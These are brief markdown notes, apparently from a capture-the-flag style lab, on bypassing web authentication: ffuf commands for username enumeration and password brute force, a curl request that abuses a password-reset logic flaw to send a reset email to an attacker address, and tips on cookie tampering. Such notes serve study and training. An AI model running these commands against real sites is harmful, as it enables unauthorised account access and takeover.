# Authentication bypass
## Username Enumeration
e.g. using signup form:

```sh
$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://$MACHINE_IP/customers/signup -mr "username already exists"
```

## Brute Force 
trying to log in with most common passwords:

```sh
$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$MACHINE_IP/customers/login -fc 200
```

## Logic Flaw 
bypassing The Intended Path, e.g. `$_REQUEST` in PHP accepting data from args AND body:

```sh
$ curl 'http://$MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

Here we provide another email in BODY and the backend might send it to the wrong one.

## Cookie Tampering 
sometimes backend isn't using a session and just accepts what a cookie is telling, e.g. admin=true (which is rare). They might be:
- Plain text
- Hashed (https://crackstation.net/)
- Encoded (e.g. base64)
